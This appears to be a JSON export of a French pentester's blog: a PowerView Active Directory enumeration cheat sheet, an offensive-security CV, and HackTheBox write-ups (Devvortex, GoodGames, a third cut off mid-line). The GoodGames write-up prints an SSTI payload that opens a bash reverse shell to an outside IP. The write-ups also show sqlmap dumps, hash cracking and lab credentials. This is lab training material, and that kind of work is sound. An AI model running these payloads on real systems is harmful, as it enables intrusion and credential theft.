id=\"-lister-les-groupes\"\u003eğŸ“‹ Lister les groupes\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rechercher-des-groupes-contenant-admin\"\u003eğŸ” Rechercher des groupes contenant \u0026ldquo;admin\u0026rdquo;\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroup\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eadmin\u003c/span\u003e\u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Name -Like \u0026#34;*admin*\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-membres--domain-admins-\"\u003eğŸ‘‘ Membres Â« Domain Admins Â»\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Domain Admins\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-Recurse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-4-machines--serveurs\"\u003eğŸ–¥ï¸ 4. Machines \u0026amp; Serveurs\u003c/h2\u003e\n\u003ch3 id=\"-liste-des-ordinateurs\"\u003eğŸ“œ Liste des ordinateurs\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainComputer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-recherche-spÃ©cifique-ex-server-2022\"\u003eğŸ” Recherche spÃ©cifique (ex. Server 2022)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-OperatingSystem\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;*Server 2022*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-test-de-connectivitÃ©\"\u003eğŸ“¡ Test de connectivitÃ©\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"n\"\u003eDNSHostName\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e%\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"nb\"\u003eTest-Connection\u003c/span\u003e \u003cspan class=\"n\"\u003e-Count\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDNSHostName\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-localisation-des-sessions-dun-utilisateur\"\u003eğŸ‘ï¸ Localisation des sessions dâ€™un utilisateur\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-DomainUserLocation\u003c/span\u003e \u003cspan class=\"n\"\u003e-UserGroupIdentity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;RDPUsers\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-5-acl-et-permissions\"\u003eğŸ” 5. ACL et Permissions\u003c/h2\u003e\n\u003ch3 id=\"-obtenir-les-acl-dun-objet\"\u003eğŸ” Obtenir les ACL dâ€™un objet\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainObjectAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-SamAccountName\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-ResolveGUIDs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rechercher-des-ace-intÃ©ressants\"\u003eğŸ§  Rechercher des ACE intÃ©ressants\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-InterestingDomainAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-ResolveGUIDs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-acl-sur-un-chemin-spÃ©cifique\"\u003eğŸ“‚ ACL sur un chemin spÃ©cifique\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-PathAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-Path\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-6-autres-techniques\"\u003eğŸ“‚ 6. Autres Techniques\u003c/h2\u003e\n\u003ch3 id=\"-dÃ©couverte-de-serveurs-de-fichiers\"\u003eğŸ“‚ DÃ©couverte de serveurs de fichiers\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetFileServer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-ressources-utiles\"\u003eğŸ“š Ressources utiles\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://powersploit.readthedocs.io/en/latest/Recon/\"\u003ePowerView Documentation (PowerSploit)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://learn.microsoft.com/en-us/powershell/module/activedirectory/\"\u003eCmdlets Active Directory Microsoft\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"Reconnaissance Active Directory avec PowerView"},{"content":" Michel NYOBE | Pentester \u0026amp; Cloud Security Enthusiast\nğŸ“ Paris, France | ğŸ“§ michelnyobe87@gmail.com | ğŸ”\nProfil PassionnÃ© par la cybersÃ©curitÃ© offensive, le je me spÃ©cialise dans les attaques Active Directory, le pentesting dâ€™environnements cloud (Azure \u0026amp; AWS), et la sÃ©curitÃ© des identitÃ©s. En formation continue et Ã  la recherche dâ€™un poste/apprentissage en Red Team ou pentest.\nLabs et Environnements Active Directory Lab (6 VM) automatisÃ© sur Azure Plateformes : TryHackMe\nHackTheBox\nRoot-Me\nDÃ©fis rÃ©guliers : Pro Labs Dante HTB Zephyr HTB https://www.root-me.org/vladimirlarass\n--- ## Formations \u0026 Certifications CRTP (A jour) â€” Certified Red Team Professional CRTE (En cours) â€” Certified Red Team Expert CARTP (En cours) â€” Certified Azure Red Team Professional CPTS (en cours) â€” Certified Penetration Testing Specialist AZ-900 (A jour) â€” Azure Fundamentals AZ-500 (A jour) â€” Azure Security Engineer SC-900 (A jour) â€” Security, Compliance, and Identity Fundamentals CNSP ( A jour ) â€” Certified Network Security Practitioner Security+ (CompTIA) : Concepts fondamentaux de la sÃ©curitÃ© SI, gestion des incidents, sÃ©curitÃ© rÃ©seau et organisationnelle HTB ProLabs : DANTE, Zephyr ExpÃ©riences ğŸ›¡ï¸ DÃ©veloppeur Logiciels de SÃ©curitÃ© â€“ ENIX (07/2023 â€“ 01/2024) DÃ©veloppement de scripts (Next.js, GraphQL) Administration dâ€™Active Directory, Wazuh, PowerShell ğŸ” DevSecOps â€“ TDR Consulting (05/2022 â€“ 07/2023) SÃ©curisation des chaÃ®nes CI/CD : Docker, Kubernetes, Jenkins Projets : Uptiimum.tech, IFPCE Africa ğŸ§  IngÃ©nieur SÃ©curitÃ© (Stage) â€“ Backbone Corp (08/2021 â€“ 10/2021) Configuration de serveurs, sauvegarde (Zabbix, Bacula) Python, documentation technique ğŸ’» Technicien Support Informatique (Stage) â€“ ENEO (07/2019 â€“ 10/2019) Administration rÃ©seau (Cisco), Active Directory Virtualisation : VMware, Proxmox ğŸ›¡ï¸ CompÃ©tences Techniques en CybersÃ©curitÃ© ğŸ” Tests dâ€™Intrusion Active Directory Les tests dâ€™intrusion AD simulent des attaques ciblant des environnements Windows dâ€™entreprise.\nğŸ Reconnaissance Active Directory EnumÃ©ration Active Directory EnumÃ©ration LDAP : ldapsearch, ADFind, SharpHound Cartographie des relations dâ€™accÃ¨s avec BloodHound (Neo4j) EnumÃ©ration DNS interne : nslookup, dig, dnscmd EnumÃ©ration des partages et services : smbclient, smbmap, rpcclient, CrackMapExec ğŸ” Techniques dâ€™authentification AS-REP Roasting : utilisateurs avec DONT_REQ_PREAUTH Kerberoasting : extraction de tickets TGS Pass-the-Hash : utilisation de hash NTLM pour lâ€™authentification Pass-the-Ticket : rÃ©utilisation de tickets Kerberos Overpass-the-Hash / Pass-the-Key : crÃ©ation de TGT NTLM Relay : ntlmrelayx, mitm6 ğŸ§¬ Exploitation des dÃ©lÃ©gations DÃ©lÃ©gation non contrainte : extraction TGT depuis les services DÃ©lÃ©gation contrainte (S4U2Self / S4U2Proxy) : abus via Rubeus RBCD (Resource-Based Constrained Delegation) : Powermad, Rubeus ğŸ› ï¸ VulnÃ©rabilitÃ©s spÃ©cifiques Zerologon (CVE-2020-1472) : Ã©lÃ©vation via Netlogon PetitPotam : coercion NTLM via MS-EFSRPC PrintNightmare (CVE-2021-34527) : RCE via spouleur Shadow Credentials : ajout de clÃ© dans AD LAPS et GPP Passwords : extraction dans SYSVOL ğŸ§‘â€ğŸ’» Mouvement latÃ©ral \u0026amp; persistance DCSync, DCShadow Golden Ticket, Silver Ticket Skeleton Key, SIDHistory abuse , - SID : Identificateurs de sÃ©curitÃ© Credential Dumping : Mimikatz, LaZagne, Rubeus, SharpDPAPI ğŸ’¥ Exploitation de VulnÃ©rabilitÃ©s ğŸ” Scanning \u0026amp; Enumeration Nmap, Nessus, OpenVAS, Nikto, LinPEAS, WinPEAS Recherche de failles : searchsploit, exploit-db, CVE.sh, VulnHub âš™ï¸ Techniques Buffer Overflow, SEH, DEP/ASLR bypass Injections : SQLi, Commande, XXE, XSS, LFI/RFI Escalade locale : kernel exploits, SUID abuse, ACL Reverse Engineering : Ghidra, strings, radare2 ğŸ“¡ Outils Metasploit, Impacket, Responder, CrackMapExec, Evil-WinRM Post-exploitation : Chisel, Ligolo, Pupy, PowerView, Empire ğŸŒ Attaques Web ğŸ” Reconnaissance Fuzzing \u0026amp; dÃ©couverte : FFUF, Gobuster, Dirsearch Interception \u0026amp; Analyse : Burp Suite, ZAP, Postman Analyse JS, robots.txt, cookies, headers HTTP ğŸ’‰ VulnÃ©rabilitÃ©s Web SQLi, XSS (Reflected, Stored, DOM) Command Injection, SSRF, XXE File Inclusion (LFI/RFI) File Upload bypass (extension, MIME) CSRF, Broken Access Control (IDOR, path traversal) Auth bypass, Brute force, JWT cracking ğŸ§ª Post-exploitation Reverse shells en PHP, Python, Bash Webshells : C99, WSO, China Chopper SSRF vers metadata AWS, Pivoting via intranet ğŸ”§ Outils Web Burp Suite, SQLmap, WFuzz, XSStrike, Commix, JWT Tool ğŸ” Cloud Security â˜ï¸ Microsoft Azure \u0026amp; Azure AD IAM \u0026amp; SÃ©curitÃ© : RBAC, PIM, Conditional Access, Identity Protection Microsoft Defender (Cloud, Endpoint) : Posture de sÃ©curitÃ©, alertes, intÃ©gration Sentinel Microsoft Sentinel (SIEM) : KQL, alertes, playbooks, dÃ©tection MITRE Outils : Az, AzureHound, Stormspotter, ROADtools, AADInternals â˜ï¸ AWS Security IAM (Roles, Policies, MFA, SCP) Logging \u0026amp; audit : CloudTrail, Config, CloudWatch DÃ©tection \u0026amp; alertes : GuardDuty, Security Hub, Macie Outils Red Team : Pacu, enumerate-iam, cloudsplaining, ScoutSuite ğŸ“Š SIEM Splunk : SPL, dÃ©tection de comportements, dashboards QRadar : corrÃ©lation, offenses, log sources Wazuh : HIDS, ELK, intÃ©gration Sysmon ğŸ“Œ Cas pratiques DÃ©tection brute force, exfiltration DNS Analyse de logs AD, GPO, accÃ¨s privilÃ©giÃ©s Threat Hunting MITRE ATT\u0026amp;CK âš™ï¸ SOAR Cortex XSOAR : Playbooks automatisÃ©s : enrichissement IOC, blocage IP IntÃ©gration avec EDR, SIEM, antivirus, email Cas dâ€™usage : phishing, quarantaine automatique, sandbox analyse ğŸ§ª Analyse de Logs \u0026amp; RÃ©ponse Ã  Incident Journaux : Syslog, Event Viewer, Apache/Nginx, Firewall, AV/EDR Techniques de Threat Hunting (MITRE, hypothesis-based) Outils : YARA, Sigma, Sysmon, KAPE, Velociraptor ğŸ“ˆ Vulnerability Management Outils : Nessus, OpenVAS, CVE.sh Processus : Scans rÃ©currents, CVSS scoring Patch management, hardening, benchmark CIS/STIG Reporting : priorisation, KPI, plans de remÃ©diation ğŸ§° Outils Techniques Offensive Burp Suite, Nmap, Metasploit, Wireshark Impacket, CrackMapExec, BloodHound Responder, Rubeus, PowerView, Mimikatz Tools Web : SQLmap, FFUF, Dirsearch, ZAP Reverse \u0026amp; Post-exploitation Ghidra, strings, radare2, Powershell Empire, Covenant ğŸ¤– Automatisation \u0026amp; Scripting Bash : durcissement Linux, audits, automatisation PowerShell : scripts dâ€™audit AD, post-exploitation Windows Python : scrapers, outils offensifs, parsing, APIs Frameworks : Requests, Paramiko, Nmap, Shodan, Flask, PyInstaller ğŸš€ CI/CD \u0026amp; DevSecOps GitHub Actions, Azure DevOps : CI/CD, linters, scan SAST Docker : images sÃ©curisÃ©es, vulnÃ©rabilitÃ© scan (Trivy, Snyk) Kubernetes (base) : RBAC, secrets, pods, monitoring IntÃ©gration des outils de sÃ©curitÃ© dans les pipelines (DevSecOps) ğŸ’» Langages de Programmation Python : outils de pentest, dÃ©tection de vulnÃ©rabilitÃ©s PHP : dÃ©veloppement Web (Laravel), injections C / C++ : exploitation mÃ©moire, reverse engineering JavaScript : dÃ©veloppement web ","permalink":"https://nyobemichel.me/about/","summary":"\u003cdiv style=\"font-size: 13px;\"\u003e\n\u003cp\u003e\u003cstrong\u003eMichel NYOBE\u003c/strong\u003e | Pentester \u0026amp; Cloud Security Enthusiast\u003cbr\u003e\nğŸ“ Paris, France | ğŸ“§ \u003ca href=\"mailto:michelnyobe87@gmail.com\"\u003emichelnyobe87@gmail.com\u003c/a\u003e | ğŸ”\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"profil\"\u003eProfil\u003c/h2\u003e\n\u003cp\u003ePassionnÃ© par la \u003cstrong\u003ecybersÃ©curitÃ© offensive\u003c/strong\u003e, le je me spÃ©cialise dans les attaques \u003cstrong\u003eActive Directory\u003c/strong\u003e, le pentesting dâ€™environnements cloud (Azure \u0026amp; AWS), et la sÃ©curitÃ© des identitÃ©s. En formation continue et Ã  la recherche dâ€™un poste/apprentissage en Red Team ou pentest.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"labs-et-environnements\"\u003eLabs et Environnements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eActive Directory Lab (6 VM) automatisÃ© sur Azure\u003c/li\u003e\n\u003cli\u003ePlateformes :\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eTryHackMe\u003c/p\u003e","title":"Whoami /All"},{"content":"Enumeration Nmap Nous avons dÃ©butÃ© l\u0026rsquo;engagement par une analyse de port Ã  l\u0026rsquo;aide de l\u0026rsquo;outil Nmap afin d\u0026rsquo;identifier les services exposÃ©s sur la cible.\nnmap -sV -sC 10.10.11.242 -v --min-rate 1000 -Pn -T4 -p- Les rÃ©sultats du scan Nmap indiquent que seuls les ports 22 (SSH) et 80 (HTTP) sont ouverts sur la cible.\nLors de l\u0026rsquo;analyse, nous avons identifiÃ© le domaine devvortex.htb, quâ€™il a Ã©tÃ© nÃ©cessaire dâ€™ajouter manuellement au fichier hosts local afin dâ€™en permettre la rÃ©solution DNS.\nSuite Ã  lâ€™Ã©numÃ©ration des sous-domaines et des rÃ©pertoires Ã  lâ€™aide de lâ€™outil ffuf , nous avons dÃ©couvert un sous-domaine supplÃ©mentaire : dev.devvortex.htb.\nLâ€™Ã©numÃ©ration des domaines associÃ©s Ã  dev.devvortex.htb nous a permis dâ€™identifier une interface dâ€™administration accessible via dev.devvortex.htb/administrator, sur laquelle nous avons constatÃ© la prÃ©sence dâ€™un template Joomla.\nAprÃ¨s avoir identifiÃ© lâ€™utilisation du CMS Joomla, nous avons analysÃ© les fichiers accessibles publiquement et inspectÃ© le code source de la page dâ€™administration. Cette investigation nous a permis de retrouver un fichier joomla.xml, situÃ© dans /administrator/manifests/files/, contenant les mÃ©tadonnÃ©es du CMS, notamment sa version exacte. Une vÃ©rification croisÃ©e via des recherches en ligne a confirmÃ© la version identifiÃ©e.\nNous avons ensuite effectuÃ© des recherches en ligne concernant la version identifiÃ©e de Joomla et avons dÃ©couvert quâ€™elle est affectÃ©e par une vulnÃ©rabilitÃ© connue et nous l\u0026rsquo;avions exploite\nruby exploit.rb http://dev.devvortex.htb user : lewis password: P4ntherg0t1n5r3c0n##\nServer-Side Template injection AprÃ¨s avoir accÃ©dÃ© Ã  lâ€™interface dâ€™administration Joomla, nous avons exploitÃ© une vulnÃ©rabilitÃ© de type Server-Side Template Injection (SSTI) prÃ©sente dans le gestionnaire de templates. Cette faille nous a permis dâ€™injecter du code cÃ´tÃ© serveur et dâ€™obtenir une exÃ©cution de commandes arbitraires sur la machine cible.\nAprÃ¨s lâ€™exploitation initiale, nous avons poursuivi avec une phase dâ€™Ã©numÃ©ration des services internes disponibles sur le rÃ©seau. Cette analyse nous a permis dâ€™identifier un service MySQL en cours dâ€™exÃ©cution. En nous connectant Ã  ce service, nous avons pu Ã©numÃ©rer les bases de donnÃ©es ainsi que leurs tables. Cette exploration nous a permis de rÃ©cupÃ©rer des informations sensibles, notamment les identifiants associÃ©s Ã  lâ€™utilisateur \u0026rsquo;logan'.\nnc -lvnp 443 $ ss -tlpn $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u\nlogan tequieromucho\nGrÃ¢ce Ã  l\u0026rsquo;identification du hash bcrypt associÃ© Ã  l\u0026rsquo;utilisateur \u0026rsquo;logan\u0026rsquo;, nous avons rÃ©ussi Ã  retrouver le mot de passe en clair par attaque par dictionnaire. Cela nous a permis de nous connecter avec succÃ¨s en ssh .\nhashcat -m 3200 lol.txt /home/kali/Documents/TryHackme/Wordlist/rockyou.txt Elevation de privilege Dans le cadre de lâ€™Ã©lÃ©vation de privilÃ¨ges, nous avons analysÃ© lâ€™environnement du systÃ¨me compromis Ã  la recherche de vulnÃ©rabilitÃ©s locales. Cette analyse nous a permis dâ€™identifier une faille de sÃ©curitÃ© connue, rÃ©fÃ©rencÃ©e sous un identifiant CVE-2023-1326, exploitable sur le systÃ¨me. En tirant parti de cette vulnÃ©rabilitÃ©, nous avons obtenu un accÃ¨s privilÃ©giÃ© (root) Ã  la machine\nReferences https://github.com/Acceis/exploit-CVE-2023-23752 https://github.com/diego-tella/CVE-2023-1326-PoC https://x.com/7h3h4ckv157/status/1728753489839628604 https://www.revshells.com/ https://academy.hackthebox.com/module/details/145\n","permalink":"https://nyobemichel.me/posts/devvortex/","summary":"Difficulte : esay","title":"Devvortex -HTB"},{"content":"Enumeration Nmap Nous dÃ©butons notre phase de reconnaissance par un scan Nmap de la cible.\n80/tcp open http Werkzeug httpd 2.0.2 (Python 3.9.2) |_http-title: GoodGames | Community and Store | http-methods: |_ Supported Methods: GET HEAD OPTIONS POST |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 |_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB Lâ€™analyse rÃ©vÃ¨le que seul le port 80 est ouvert et quâ€™il hÃ©berge un serveur HTTP Python via Werkzeug 2.0.2.\nServeur Web Python En accÃ©dant au site via le port 80, nous tombons sur une interface web : http://goodgames.htb/\nAjout de lâ€™entrÃ©e DNS au fichier hosts :\nsudo echo \u0026#34;10.10.11.130 goodgames.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts En inspectant la fonctionnalitÃ© de connexion, une tentative d\u0026rsquo;injection SQL est envisagÃ©e. Toutefois, l\u0026rsquo;application impose la saisie dâ€™une adresse e-mail valide.\nNous utilisons alors une adresse valide, puis interceptons la requÃªte dans Burp Suite pour modifier lâ€™e-mail en admin@goodgames.htb. Une fois soumise, un message de bienvenue sâ€™affiche, indiquant une possible compromission du compte administrateur.\nInjection SQL AprÃ¨s confirmation d\u0026rsquo;une vulnÃ©rabilitÃ© SQLi, nous enregistrons la requÃªte HTTP dans un fichier nommÃ© goodgames.req afin de l\u0026rsquo;exploiter avec sqlmap.\nsqlmap -r goodgames.req --dbs Sqlmap rÃ©vÃ¨le deux bases de donnÃ©es :\ninformation_schema\nmain\nNous listons ensuite les tables de la base main :\nsqlmap -r goodgames.req -D main --tables Et enfin, nous extrayons les donnÃ©es de la table user :\nsqlmap -r goodgames.req -D main -T user --dump RÃ©sultat :\nadmin@goodgames.htb : superadministrator Portail Interne d\u0026rsquo;Administration En haut Ã  droite du tableau de bord, une icÃ´ne dâ€™engrenage mÃ¨ne Ã  une URL interne :\nhttp://internal-administration.goodgames.htb/login\nAjout de lâ€™entrÃ©e dans le fichier hosts :\nsudo echo \u0026#34;10.10.11.130 internal-administration.goodgames.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Nous utilisons les identifiants extraits (admin / superadministrator) pour accÃ©der Ã  lâ€™interface d\u0026rsquo;administration. Cela nous donne accÃ¨s au dashboard.\nSSTI (Server-Side Template Injection) Nous suspectons une vulnÃ©rabilitÃ© SSTI. Une charge utile de test est injectÃ©e :\n{{ namespace.__init__.__globals__.os.popen(\u0026#39;id\u0026#39;).read() }} La commande est exÃ©cutÃ©e, confirmant la vulnÃ©rabilitÃ©. Nous exploitons cela pour obtenir un reverse shell :\n{{ namespace.__init__.__globals__.os.popen(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;).read() }} Escalade de PrivilÃ¨ges Ã‰numÃ©ration Lâ€™environnement montre plusieurs signes dâ€™une exÃ©cution dans un conteneur Docker. On y observe Ã©galement des fichiers liÃ©s Ã  un utilisateur inconnu (UID 1000) inexistant dans /etc/passwd.\nUne adresse IP privÃ©e suggÃ¨re une architecture en rÃ©seau Docker. Nous rÃ©alisons un scan ping :\nfor i in {1..254}; do (ping -c 1 172.19.0.${i} | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done Et un scan des ports :\nfor port in {1..65535}; do echo \u0026gt; /dev/tcp/172.19.0.1/$port \u0026amp;\u0026amp; echo \u0026#34;$port open\u0026#34;; done 2\u0026gt;/dev/null Le processus docker est actif sur le systÃ¨me.\nL\u0026rsquo;utilisateur augustus, prÃ©sent sur le systÃ¨me, dispose dâ€™un rÃ©pertoire utilisateur contenant des fichiers identiques Ã  ceux du conteneur.\nÃ‰vasion de Conteneur \u0026amp; AccÃ¨s Root Nous copions /bin/bash dans le rÃ©pertoire dâ€™augustus :\nPuis exÃ©cutons le binaire avec lâ€™option -p pour prÃ©server les privilÃ¨ges root :\n./bash -p Cela nous accorde un shell avec les droits root hors du conteneur.\n","permalink":"https://nyobemichel.me/posts/goodgame/","summary":"Difficulte : esay","title":"GoodGame-HTB"},{"content":"Enumeration Nmap Enumeration Nmap Nous commenÃ§ons par exÃ©cuter une analyse nmap sur la cible :\nLe scan rÃ©vÃ¨le que les ports 22, 80 et 8761 sont ouverts sur la cible.\nEn explorant le port 80, nous avons dÃ©couvert un site web accessible Ã  l\u0026rsquo;adresse furni.htb.\nAfin dâ€™identifier dâ€™Ã©ventuelles ressources non listÃ©es accessibles sur le serveur web de la cible http://furni.htb, un fuzzing de rÃ©pertoires a Ã©tÃ© rÃ©alisÃ© Ã  lâ€™aide de lâ€™outil ffuf.\nffuf -u http://furni.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt Cela m\u0026rsquo;a permis dâ€™identifier plusieurs sous-domaines associÃ©s Ã  la cible. Ces sous-domaines peuvent hÃ©berger des fichiers, dossiers ou applications supplÃ©mentaires potentiellement intÃ©ressants Ã  la suite de lâ€™analyse.\nAprÃ¨s avoir tÃ©lÃ©chargÃ© l\u0026rsquo;ensemble des fichiers disponibles et entamÃ© leur analyse un par un, j\u0026rsquo;ai identifiÃ© un fichier nommÃ© headpdump. En examinant son contenu, j\u0026rsquo;ai recherchÃ© la prÃ©sence Ã©ventuelle d\u0026rsquo;informations sensibles telles que des identifiants ou des mots de passe. Cette inspection mâ€™a permis de mettre en Ã©vidence des donnÃ©es potentiellement intÃ©ressantes.\npassword=0sc@r190_S0l!dP@sswd, user=oscar190\nhttp://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!\nOscar parvient Ã  se connecter via SSH, mais j\u0026rsquo;ai Ã©galement repÃ©rÃ© le service Eureka. Afin d\u0026rsquo;y accÃ©der, je vais configurer une redirection de port pour pouvoir me connecter au port 8761.\nssh -L 8761:localhost:8761 oscar190@10.10.11.66 Les identifiants rÃ©cupÃ©rÃ©s seront testÃ©s sur lâ€™ensemble des interfaces de connexion identifiÃ©es prÃ©cÃ©demment. login: 